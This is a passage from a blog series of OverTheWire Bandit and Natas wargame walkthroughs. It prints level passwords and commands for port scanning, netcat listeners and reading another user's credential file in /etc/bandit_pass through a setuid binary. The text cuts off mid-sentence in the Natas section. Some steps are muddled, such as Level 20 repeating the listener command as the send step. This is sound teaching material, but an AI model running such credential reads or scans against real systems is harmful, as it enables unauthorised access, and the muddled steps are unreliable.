[{"content":"Blog 1: Getting Started with Bandit – Basic Linux Commands Introduction Welcome to the first installment of my 7-week journey through the OverTheWire Bandit challenges! Bandit is an excellent platform for beginners to get hands-on experience with Linux command-line interface (CLI) and foundational security concepts. In this blog, I’ll walk you through the initial levels (0–4), covering basic navigation, file operations, and hidden files. By the end of this, you’ll have a solid understanding of essential Linux commands and how to apply them in real-world scenarios.\nLevels Overview Levels Covered: 0–4 Theme: Introduction to Linux CLI, basic navigation, hidden files, and file viewing. Skills Learned: Using SSH to connect to remote servers Navigating the Linux file system Listing and viewing files, including hidden ones Understanding file types Level-by-Level Walkthrough Level 0: Connecting with SSH Objective: Connect to the Bandit server using SSH. Challenge Description: The goal of this level is for you to log into the game using SSH. Commands/Tools Introduced: ssh Solution: Connecting to the Server: To start, use the SSH command provided by OverTheWire to connect to the Bandit server.\nssh bandit0@bandit.labs.overthewire.org -p 2220 -p command is used to specify the port you wanna run on your ssh terminal, if you don\u0026rsquo;t specify that then the command will run on the port 22 and you will not be able to login the game.\nEntering the Password: The initial password for Bandit Level 0 is bandit0.\nLevel 1: Read a File Objective: Find the file that contains the password for the next level. Challenge Description: The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game. Commands/Tools Introduced: ls, cat Solution: Listing Files: Use the ls command to list all files in the current directory. ls Output: readme Viewing File Content: Use the cat command to display the contents of the readme file. cat readme Output: Congratulations on your first steps into the bandit game!! Please make sure you have read the rules at https://overthewire.org/rules/ If you are following a course, workshop, walkthrough or other educational activity, please inform the instructor about the rules as well and encourage them to contribute to the OverTheWire community so we can keep these games free! The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If This reveals the password for Bandit Level 1. Level 2: Unusual named Files Objective: Find the password in a file. Challenge Description: The password for the next level is stored in a file called - located in the home directory. Commands/Tools Introduced: ls -a, cat Solution: Listing All Files: Use ls to list all files.\nls Output:\n- Viewing the Hidden File: Use the cat command to read the contents of the file that contains the passowrd.\ncat ./- Output:\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx This displays the password for the next level.\nNote -We use ./- instead of - as - is a special symbol in linux and it is not recommended to start a filename with -. Hence, if we run the command cat -, it will not return anything.\nLevel 3: Spaces in the Filename Objective: Find the password hidden in a file. Challenge Description: The password for the next level is stored in a file called spaces in this filename located in the home directory. Commands/Tools Introduced: ls, cat Solution: Listing All Files: Use ls to list all files.\nls Output:\nspaces in this filename Opening the file: Attempting to read the file without quotes will result in an error since spaces are interpreted as separating multiple file names.\ncat spaces in this filename Output:\ncat: spaces: No such file or directory cat: in: No such file or directory cat: this: No such file or directory cat: filename: No such file or directory Therefore we use double quotes to handble the filename correctly and get the commands. We can also use the / instead of the double quotes to skip spaces within the filenames.\ncat \u0026#34;spaces in this filename\u0026#34; Output:\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx Level 4: Navigating Hidden Directories Objective: Discover the hidden directory and find the password within. Challenge Description: The password for the next level is stored in a hidden file in the inhere directory. Commands/Tools Introduced: cd, ls, cat Solution: Navigating to the Directory: Change directory. cd .inhere Listing Directories Including Hidden Ones: I started by running ls to check the contents of the inhere directory, but nothing showed up. ls Output: total 0 Revealing Hidden Files: Realizing there might be hidden files, I used ls -a to list everything, including hidden files. That’s when I spotted \u0026hellip;Hiding-From-You. ls -a Output: . .. \u0026hellip;Hiding-From-You\n4. **Viewing the Password File:** ```bash cat ...Hiding-From-You Output:\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ This reveals the password for Bandit Level 5.\nKey Takeaways SSH: Learned how to establish secure connections to remote servers using SSH. Linux Navigation: Mastered basic commands like ls, cd, and cat for navigating the file system and viewing file contents. Hidden Files: Understood how to identify and interact with hidden files using ls -a. Cheatsheet for This Week Commands Covered: ssh: Connect to a remote server. ssh username@hostname -p port ls: List directory contents. ls ls -a: List all files, including hidden ones. ls -a cat: Concatenate and display file content. cat filename Concepts: SSH Basics: Securely connecting to remote servers. File Navigation: Moving through directories and listing files. Hidden Files: Identifying and accessing hidden files. What’s Next Next week, we’ll delve into file permissions and manipulation in Linux, covering Bandit Levels 5–9. Understanding permissions is crucial for managing file access and ensuring system security. We’ll explore commands like chmod, chown, and more advanced file operations.\nAdditional Resources OverTheWire Bandit Official Website SSH Tutorial for Beginners Linux Command Line Basics Understanding Hidden Files in Linux ","permalink":"https://knamit.github.io/blogs/posts/bandit/bandit_0/","summary":"\u003ch1 id=\"blog-1-getting-started-with-bandit--basic-linux-commands\"\u003eBlog 1: Getting Started with Bandit – Basic Linux Commands\u003c/h1\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eWelcome to the first installment of my 7-week journey through the OverTheWire Bandit challenges! Bandit is an excellent platform for beginners to get hands-on experience with Linux command-line interface (CLI) and foundational security concepts. In this blog, I’ll walk you through the initial levels (0–4), covering basic navigation, file operations, and hidden files. By the end of this, you’ll have a solid understanding of essential Linux commands and how to apply them in real-world scenarios.\u003c/p\u003e","title":"Bandit Part 1"},{"content":"Blog 2: Understanding Permissions and File Manipulation in Linux Introduction In this blog, we’ll dive deeper into file permissions, file size filtering, and file redirection, covering Levels 5 through 9 of the OverTheWire Bandit challenge. Knowing these skills is essential for navigating Linux environments effectively and understanding the basics of file security and manipulation. Let’s get started!\nLevels Overview Levels Covered: 5–9 Theme: File permissions, file manipulation, and filtering files by properties. **Skills Learned:**m Changing file permissions using chod Filtering files by size and owner Using file redirection Level-by-Level Walkthrough Level 5: Working with File types **Objective:**Discover the human readable file and find the password within. Challenge Description: The password for the next level is stored in the only human-readable file in the inhere directory Commands/Tools Introduced: file Solution: Navigating to the inhere directory: I started by running ls in my home directory and noticed a folder named inhere. Since the files I needed were in this directory, I used the cd command to change into the inhere/ directory.\ncd inhere/ Output:\nListing the files with ls: Once inside the inhere directory, I ran ls to list the files. I saw that the files had unusual names starting with a dash (-), like -file00, -file01, etc.\nls Listing the files in long format with permissions (ls -l): I used ls -l to get detailed information about the files, including their permissions, owner, group, and size. Each file turned out to be 33 bytes in size, and the permissions showed that only the owner had read access.\nThis step was important to understand the file permissions and confirm the small size of the files. Knowing that the files were only 33 bytes made it more likely that the files contained something simple, like a password.\nChecking file types with file: Since I was looking for a human-readable file, I used the file command to check the type of each file. Most of the files were just data, but -file07 was identified as an ASCII text file, which meant it was likely to contain the password.\nfile ./* Output:\n./-file00: data ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data Running file allowed me to quickly distinguish between data files and text files. Since only one file was human-readable (ASCII text), it helped me narrow down the file that likely contained the password without manually checking every file.\nReading the File: I used cat to retrieve the password from the human readable file.\ncat ./-file07 Output: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\nLevel 6: Human-readable files and non-executable files Objective: The password is stored in a file with a specific size. Challenge Description: Find a file in the inhere directory that is exactly 1033 bytes, humar readable and not executable Commands/Tools Introduced: find, ls, cat Solution: Navigating to the inhere directory: First, I used ls in my home directory to check for any directories. I found inhere and navigated into it using the cd command.\ncd inhere/ Listing all files and directories: I used ls -la to list all files, including hidden files, inside the inhere directory. This showed me several directories labeled maybehere00 through maybehere19, each containing multiple files.\nls -la Identifying human-readable files with file: To avoid manually opening each file, I used the file command to check the type of every file in each directory. This helped me filter out files that were not human-readable.\nfile */{.,}* I then used grep to filter out files that were not ASCII text and further refined the search by excluding files with very long lines.\nfile */{.,}* | grep \u0026#34;ASCII text\u0026#34; | grep -v \u0026#39;, with very long lines\u0026#39; The file command saved me a lot of time by identifying which files were human-readable, and using grep helped me further narrow down the list by excluding unwanted results.\nFiltering by size using du: Since the task required the file to be exactly 1033 bytes, I used the du command to find files of that exact size.\ndu -b -a | grep 1033 This revealed one file, maybehere07/.file2, which matched the size criteria.\n./maybehere07/.file2 This step was crucial to ensure that I found a file with the exact required size, reducing the number of files I needed to check manually.\nChecking if the file is non-executable: I used the find command to search for non-executable files, which helped confirm that the file maybehere07/.file2 was not executable.\nfind . -type f -size 1033c ! -executable -exec file \u0026#39;{}\u0026#39; \\; | grep ASCII The file needed to be non-executable, so using find helped ensure that I met this criterion.\nReading the contents of the file: Finally, I used cat to read the contents of the file and retrieve the password.\ncat ./maybehere07/.file2 Output:\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG Level 6 Screenshot\nLevel 7: User specific file and group ownership Objective: Get the password from a file with specific permissions. Challenge Description: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size Commands/Tools Introduced: find, file ownership (-user, -group). Solution: Getting the file: I used the find command with the following options: -type f, because we are looking for a file -user bandit7, to find files owned by the ‘bandit7’ user -group bandit6, to find files owned by the ‘bandit6’ group -size 33c, to find files of size 33 bytes\nfind / -type f -user bandit7 -group bandit6 -size 33c Now this returned me the output attatched below adding a 2\u0026gt;/dev/null returned only the files that I required. I got this trick using as I studied a shell course at my unversity.\nGetting the passowrd: To the get file that had the password I added 2\u0026gt;/dev/null to the bash command above and I got this output\nvar/lib/dpkg/info/bandit7.password Verifying the Output: To confirm, I used cat to check that the password was written successfully.\ncat var/lib/dpkg/info/bandit7.password Output: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\nLevel 7 Screenshot\nLevel 8: Grep and piping Objective: Find a line which has the password Challenge Description: The password for the next level is stored in the file data.txt next to the word millionth Commands/Tools Introduced: grep, |. Solution: Listing files in the home directory: First, I used ls -la to list all files in my home directory. This revealed a large file named data.txt.\nls -la Output\ndrwxr-xr-x 2 root root 4096 Sep 19 07:08 . drwxr-xr-x 70 root root 4096 Sep 19 07:09 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3771 Mar 31 2024 .bashrc -rw-r----- 1 bandit8 bandit7 4184396 Sep 19 07:08 data.txt -rw-r--r-- 1 root root 807 Mar 31 2024 .profile The file data.txt was quite large, containing 4184396 bytes of data, making it impractical to manually search through it and get the password.\nUsing grep to find the word \u0026ldquo;millionth\u0026rdquo; and password: Since the password is next to the word \u0026ldquo;millionth\u0026rdquo;, I used grep to search for lines containing that word in the data.txt file.\ncat data.txt | grep millionth Output\nmillionth dfvuzFQi4muU8wfNbFOe9ROwksMLg7eEc Using grep allowed me to efficiently search through the file and find the line containing \u0026ldquo;millionth\u0026rdquo; along with the password.The password was displayed on the same line as the word \u0026ldquo;millionth\u0026rdquo;, and I was able to use it to progress to the next level.\nLevel 9: Uniq and sort Objective: Find a line which has the password Challenge Description: The password for the next level is stored in the file data.txt and is the only line of text that occurs only once Commands/Tools Introduced: grep, sort, uniq Solution: Listing files in the home directory: First, I listed the contents of my home directory to find the file data.txt.\nls -l Sorting and finding the unique line: Since the password is on a line that appears only once, I used the sort command to organize the file and then piped it to uniq -u to filter out only the unique line.\nsort data.txt | uniq -u Output:\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM Similar to the previous one, I knew these commands since I have some background on how to use these (sort and uniq) commands.\nKey Takeaways Permissions and Ownership: I learned how to identify files based on ownership and permissions using find with flags for user, group, and file size. File Type Identification: Using file helped me quickly find human-readable files among various data files. File Filtering: I practiced searching for specific text in large files with grep, sorting with sort, and identifying unique lines with uniq. Non-executable Files: I used find to filter out executable files and focus only on non-executable ones for certain challenges. Cheatsheet for This Week Commands Covered: find: Search for files based on criteria (size, ownership, non-executable). find / -user bandit8 -group bandit7 -size 33c ! -executable file: Identify file types (e.g., ASCII, data). file ./* grep: Search for patterns within files. grep \u0026#34;pattern\u0026#34; filename sort and uniq: Sort and find unique lines in a file. sort filename | uniq -u du: Check file sizes. du -b -a | grep 1033 Progress Gallery Level 5: Working with File types Level 6: Human-readable files and non-executable files *Level 7: User specific file and group ownership Level 8: Grep and piping Level 9: Uniq and sort What’s Next Next week, I’ll be covering Levels 10–14, where we’ll dive into advanced file manipulation and searching within files\nAdditional Resources OverTheWire Bandit Official Website Linux Permissions Guide Find Command in Linux ","permalink":"https://knamit.github.io/blogs/posts/bandit/bandit_1/","summary":"\u003ch1 id=\"blog-2-understanding-permissions-and-file-manipulation-in-linux\"\u003eBlog 2: Understanding Permissions and File Manipulation in Linux\u003c/h1\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this blog, we’ll dive deeper into file permissions, file size filtering, and file redirection, covering Levels 5 through 9 of the OverTheWire Bandit challenge. Knowing these skills is essential for navigating Linux environments effectively and understanding the basics of file security and manipulation. Let’s get started!\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"levels-overview\"\u003eLevels Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLevels Covered:\u003c/strong\u003e 5–9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTheme:\u003c/strong\u003e File permissions, file manipulation, and filtering files by properties.\u003c/li\u003e\n\u003cli\u003e**Skills Learned:**m\n\u003cul\u003e\n\u003cli\u003eChanging file permissions using \u003ccode\u003echod\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFiltering files by size and owner\u003c/li\u003e\n\u003cli\u003eUsing file redirection\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"level-by-level-walkthrough\"\u003eLevel-by-Level Walkthrough\u003c/h2\u003e\n\u003ch3 id=\"level-5-working-with-file-types\"\u003eLevel 5: Working with File types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e**Objective:**Discover the human readable file and find the password within.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eChallenge Description:\u003c/strong\u003e The password for the next level is stored in the only human-readable file in the inhere directory\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommands/Tools Introduced:\u003c/strong\u003e \u003ccode\u003efile\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"solution\"\u003eSolution:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNavigating to the \u003ccode\u003einhere\u003c/code\u003e directory:\u003c/strong\u003e\nI started by running \u003ccode\u003els\u003c/code\u003e in my home directory and noticed a folder named \u003ccode\u003einhere\u003c/code\u003e. Since the files I needed were in this directory, I used the \u003ccode\u003ecd\u003c/code\u003e command to change into the \u003ccode\u003einhere/\u003c/code\u003e directory.\u003c/p\u003e","title":"Bandit Part 2"},{"content":"Blog 3: Getting Started with Bandit Levels Overview Levels Covered: 10–15 Theme: Encoding and decoding data, SSH key authentication, and submitting passwords using different tools. Skills Learned: Decoding base64 and Rot13 encoded data Decompressing hexdumped data Using SSH key authentication Submitting passwords using Netcat and OpenSSL Level-by-Level Walkthrough Level 10: base64 Encoding Challenge Description: The password for the next level is stored in the file data.txt, which contains base64 encoded data. Commands/Tools Introduced: base64 Solution: Connecting to the Server: Connect to the Bandit Level 10 server using the password obtained from the previous level.\nReading the Password: We cat the data.txt file and see that the content is base64 encoded.\nDecoding the Base64 Data: We use the base64 command to decode the data and display the password.\ncat data.txt | base64 --decode This reveals the password for Bandit Level 11.\nLevel 11: Rot13 Encoding Objective: Find the password hidden in a file. Challenge Description: The password for the next level is stored in the file data.txt, which contains Rot13 encoded data. Commands/Tools Introduced: tr Solution: Connecting to the Server: Connect to the Bandit Level 11 server using the password obtained from the previous level.\nReading the Password: We cat the data.txt file and see that the content is Rot13 encoded.\nDecoding the Rot13 Data: We use the tr command to decode the data and display the password.\ncat data.txt | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39; This reveals the password for Bandit Level 12.\nLevel 12: Hexdump to ASCII Objective: Find the password hidden in a file. Challenge Description: The password for the next level is stored in the file data.txt, which contains hexdumped data that has been repeatedly compressed. Commands/Tools Introduced: xxd, tr, gzip, bzip2, zcat Solution: Connecting to the Server: Connect to the Bandit Level 12 server using the password obtained from the previous level.\nReading the Password: We cat the data.txt file and see that the content is hexdumped. We also see the header 1f8b0800 which indicates that the data is compressed using gzip. We repeatedly decompress the data using gzip, bzip2, and zcat until we get the password. Headers for different compression formats:\ngzip: 1f8b0800 bzip2: 425a68 xz: fd377a585a00 Getting the Final Data: In the end we see a file named data8.bin which contains the password.\nLevel 13: SSH Key Authentication Objective: Find the password hidden in a file. Challenge Description: The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Commands/Tools Introduced: ssh, chmod Solution: Connecting to the Server: Connect to the Bandit Level 13 server using the password obtained from the previous level.\nReading the Password: We see that the password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. This prompts us to use the private SSH key provided to log in as bandit14.\nUsing the Private Key: We save the private key to a file on our local machine and change its permissions to make it usable.\nchmod 600 sshkey.private We then use this private key to SSH into the next level.\nssh -i sshkey.private bandit14@localhost This logs us into Bandit Level 14. Once in, we can read the password for the next level.\nLevel 14: Netcat Objective: Find the password hidden in a file. Challenge Description: The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost. Commands/Tools Introduced: nc Solution: Connecting to the Server: Connect to the Bandit Level 14 server using the password obtained from the previous level.\nSubmitting the Password: We submit the password for Bandit Level 14 to port 30000 on localhost using nc.\nRetrieving the Password: We send the password using nc and receive the password for the next level.\nLevel 15: OpenSSL Objective: Find the password hidden in a file. Challenge Description: The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption. Commands/Tools Introduced: openssl Solution: Connecting to the Server: Connect to the Bandit Level 15 server using the password obtained from the previous level.\nSubmitting the Password: We submit the password for Bandit Level 15 to port 30001 on localhost using openssl. Same as the previous level, instead of using nc, we use openssl.\nopenssl s_client -connect localhost:30001 Retrieving the Password: We send the password using openssl and receive the password for the next level.\nKey Takeaways Base64 Encoding (Level 10):\nUse the base64 --decode command to decode base64 encoded data. Rot13 Encoding (Level 11):\nUse the tr 'A-Za-z' 'N-ZA-Mn-za-m' command to decode Rot13 encoded data. Hexdump to ASCII (Level 12):\nIdentify the compression format using file headers (gzip: 1f8b0800, bzip2: 425a68, xz: fd377a585a00). Use gzip, bzip2, and zcat to decompress repeatedly until you retrieve the password. SSH Key Authentication (Level 13):\nSave the provided private SSH key, change its permissions with chmod 600, and use it to SSH into the next level. Netcat (Level 14):\nUse nc to submit the current level\u0026rsquo;s password to a specific port (30000) to retrieve the next level\u0026rsquo;s password. OpenSSL (Level 15):\nUse openssl s_client -connect localhost:30001 to submit the password over SSL and receive the next level\u0026rsquo;s password. Cheatsheet # Level 10: Base64 Decoding cat data.txt | base64 --decode # Level 11: Rot13 Decoding cat data.txt | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39; # Level 12: Decompressing Hexdump # Identify headers for compression # Use the following commands repetitively based on the header gzip -d data.txt # for gzip bzip2 -d data.txt # for bzip2 zcat data.txt # for zcat # Level 13: Using SSH Key chmod 600 sshkey.private ssh -i sshkey.private bandit14@localhost # Level 14: Submitting Password with Netcat echo \u0026#34;current_password\u0026#34; | nc localhost 30000 # Level 15: Submitting Password with OpenSSL openssl s_client -connect localhost:30001 ","permalink":"https://knamit.github.io/blogs/posts/bandit/bandit_10_15/","summary":"\u003ch1 id=\"blog-3-getting-started-with-bandit\"\u003eBlog 3: Getting Started with Bandit\u003c/h1\u003e\n\u003ch2 id=\"levels-overview\"\u003eLevels Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLevels Covered:\u003c/strong\u003e 10–15\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTheme:\u003c/strong\u003e Encoding and decoding data, SSH key authentication, and submitting passwords using different tools.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills Learned:\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003eDecoding base64 and Rot13 encoded data\u003c/li\u003e\n\u003cli\u003eDecompressing hexdumped data\u003c/li\u003e\n\u003cli\u003eUsing SSH key authentication\u003c/li\u003e\n\u003cli\u003eSubmitting passwords using Netcat and OpenSSL\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"level-by-level-walkthrough\"\u003eLevel-by-Level Walkthrough\u003c/h2\u003e\n\u003ch3 id=\"level-10-base64-encoding\"\u003eLevel 10: base64 Encoding\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eChallenge Description:\u003c/strong\u003e The password for the next level is stored in the file data.txt, which contains base64 encoded data.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommands/Tools Introduced:\u003c/strong\u003e \u003ccode\u003ebase64\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"solution\"\u003eSolution:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConnecting to the Server:\u003c/strong\u003e\nConnect to the Bandit Level 10 server using the password obtained from the previous level.\u003c/p\u003e","title":"Bandit Part 3"},{"content":"Blog 4: Getting Started with Bandit Levels Overview Levels Covered: 16–20 Theme: Nmap scanning, file comparison, SSH key authentication, and using setuid binaries. Skills Learned: Scanning for open ports using Nmap Comparing files using diff Using SSH with pseudo-terminal Utilizing setuid binaries for file access Setting up listeners with Netcat Level-by-Level Walkthrough Level 16: Nmap Objective: Find the password hidden in a file. Challenge: The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. Commands/Tools Introduced: nmap Solution: Connecting to the Server: Connect to the Bandit Level 16 server using the password obtained from the previous level.\nScanning for Open Ports: We use nmap to scan the ports in the range 31000 to 32000 on localhost.\nnmap -sV -T4 localhost -p 31000-32000 Here, -sV is used to determine service version, and -T4 is the timing template for the scan.\nIdentifying the Correct Port: We find that port 31790 is running an SSL service.\nSubmitting the Password: We submit the password for Bandit Level 16 to port 31790 on localhost using openssl. We get a private key that can be used to log in to the next level.\nLevel 17: Diff Objective: Find the password hidden in a file. Challenge Description: The password for the next level can be retrieved by comparing two files in the directory. The password is the only line that is different between the two files. Commands/Tools Introduced: diff Solution: Connecting to the Server: Connect to the Bandit Level 17 server using the password obtained from the previous level.\nComparing Files: We compare two files in the directory using diff.\ndiff passwords.old passwords.new This reveals the password for the next level.\nLevel 18: SSH Key Authentication Objective: Find the password hidden in a file. Challenge Description: The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH. Commands/Tools Introduced: ssh Solution: Connecting to the Server: Connect to the Bandit Level 18 server using the password obtained from the previous level.\nReading the Password: The issue here is that when we log in, we are immediately logged out due to a modification in the .bashrc file. To overcome this, we can specify a pseudo-terminal to run a shell instead of executing the .bashrc file.\nssh bandit18@bandit.labs.overthewire.org -p 2220 -t /bin/sh This logs us in and we can read the password for the next level.\nLevel 19: Setuid Binary Objective: Find the password hidden in a file. Challenge Description: To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary. Commands/Tools Introduced: setuid Solution: Connecting to the Server: Connect to the Bandit Level 19 server using the password obtained from the previous level.\nUsing the Setuid Binary: We have a setuid binary in the home directory. Running it without arguments gives us a hint on how to use it.\nbandit19@bandit:~$ ./bandit20-do Run a command as another user. We can use this binary to read the password for the next level.\nReading the Password: We use the setuid binary to read the password for the next level.\n./bandit20-do cat /etc/bandit_pass/bandit20 This reveals the password for Bandit Level 20.\nLevel 20: Setuid Binary with Netcat Objective: Find the password hidden in a file. Challenge Description: There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). Commands/Tools Introduced: setuid, nc, tmux Solution: Connecting to the Server: Connect to the Bandit Level 20 server using the password obtained from the previous level.\nUsing Tmux: Instead of running 2 SSH sessions, we can use tmux to split the terminal into two panes.\nSetting Up the Listener: In one pane, we set up a listener on a port using nc.\nnc -l -p 1234 Running the Setuid Binary: In the other pane, we run the setuid binary with the port number as an argument.\n./suconnect 1234 Sending the Password: We send the password for Bandit Level 20 to the listener using nc.\nnc -l -p 1234 This reveals the password for Bandit Level 21.\nKey Takeaways Nmap (Level 16):\nUse nmap -sV -T4 localhost -p 31000-32000 to scan for open ports and determine which ones run SSL services. Identify the correct port that will provide the next credentials. Diff (Level 17):\nUse diff file1 file2 to compare two files and identify the differences, revealing the password. SSH Key Authentication (Level 18):\nWhen logging in with SSH fails due to .bashrc issues, use ssh -t user@host -p port /bin/sh to bypass the logout. Setuid Binary (Level 19):\nExecute a setuid binary without arguments to learn how to use it. Use the binary to access protected files, such as passwords stored in /etc/bandit_pass. Setuid Binary with Netcat (Level 20):\nUtilize tmux to manage multiple terminal sessions efficiently. Set up a listener with nc -l -p port to receive data and connect it with a setuid binary that checks the password. Cheatsheet # Level 16: Nmap Scan nmap -sV -T4 localhost -p 31000-32000 # Level 17: Comparing Files diff passwords.old passwords.new # Level 18: SSH with Pseudo-Terminal ssh bandit18@bandit.labs.overthewire.org -p 2220 -t /bin/sh # Level 19: Using Setuid Binary ./bandit20-do # Run without arguments to see usage ./bandit20-do cat /etc/bandit_pass/bandit20 # To read the password # Level 20: Setuid with Netcat and Tmux # Start Tmux session and split terminal nc -l -p 1234 # In one pane, set up a listener ./suconnect 1234 # In the other pane, run the setuid binary # Send the current password to the listener ","permalink":"https://knamit.github.io/blogs/posts/bandit/bandit_16-20/","summary":"\u003ch1 id=\"blog-4-getting-started-with-bandit\"\u003eBlog 4: Getting Started with Bandit\u003c/h1\u003e\n\u003ch2 id=\"levels-overview\"\u003eLevels Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLevels Covered:\u003c/strong\u003e 16–20\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTheme:\u003c/strong\u003e  Nmap scanning, file comparison, SSH key authentication, and using setuid binaries.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills Learned:\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003eScanning for open ports using Nmap\u003c/li\u003e\n\u003cli\u003eComparing files using \u003ccode\u003ediff\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUsing SSH with pseudo-terminal\u003c/li\u003e\n\u003cli\u003eUtilizing setuid binaries for file access\u003c/li\u003e\n\u003cli\u003eSetting up listeners with Netcat\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"level-by-level-walkthrough\"\u003eLevel-by-Level Walkthrough\u003c/h2\u003e\n\u003ch3 id=\"level-16-nmap\"\u003eLevel 16: Nmap\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eObjective:\u003c/strong\u003e Find the password hidden in a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eChallenge:\u003c/strong\u003e The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommands/Tools Introduced:\u003c/strong\u003e \u003ccode\u003enmap\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"solution\"\u003eSolution:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConnecting to the Server:\u003c/strong\u003e\nConnect to the Bandit Level 16 server using the password obtained from the previous level.\u003c/p\u003e","title":"Bandit Part 4"},{"content":"Blog 1: Getting Started with Natas – Web Security Fundamentals Introduction Welcome to the Natas web security challenge series! This blog marks the start of a journey through Natas, a platform created to enhance understanding of web security concepts like basic authentication, HTTP headers, and source code analysis. In this post, I\u0026rsquo;ll guide you through the initial levels, where we’ll explore fundamental techniques for assessing web vulnerabilities.\nLevels Overview Levels Covered: 0–4 Theme: Basics of web authentication, HTTP protocols, and client-server interactions. Skills Learned: Basic authentication techniques HTTP headers and responses Analyzing HTML and source code for security flaws Introduction to input validation vulnerabilities Level-by-Level Walkthrough Level 0: Source Code Analysis Commands/Tools Introduced: Browser developer tools. Solution Outline: Accessing the Page: Look at the source code for the initial page and identify the password for Natas1. Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq Level 1: Source Code Analysis Part 2 Commands/Tools Introduced: Browser developer tools. Solution Outline: Accessing the Page: Look at the source code for the initial page and identify the password for Natas2. This time, right-click is disabled. Used the shortcut to open the developer tools. Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI Level 2: Publicly Available Files Commands/Tools Introduced: Developer tools. Solution Outline: Viewing the Source Code: Looked at the source code. Found reference to files/pixel.png and accessed it directly.\nSearching for More Clues Accessed the files directory and found a file called users.txt with the password for Natas3.\nPassword: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH Level 3: Robots.txt and Hidden Files Commands/Tools Introduced: Developer tools. Solution Outline: Source Code Analysis: Looking at the source code, found a suspicious comment - \u0026lt;!-- No more information leaks!! Not even Google will find it this time... --\u0026gt;.\nChecking Robots.txt: Found a reference to /s3cr3t/ in robots.txt. Accessed the directory and found the password for Natas4 in users.txt.\nPassword: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ Level 4: Referer Header and Access Control Commands/Tools 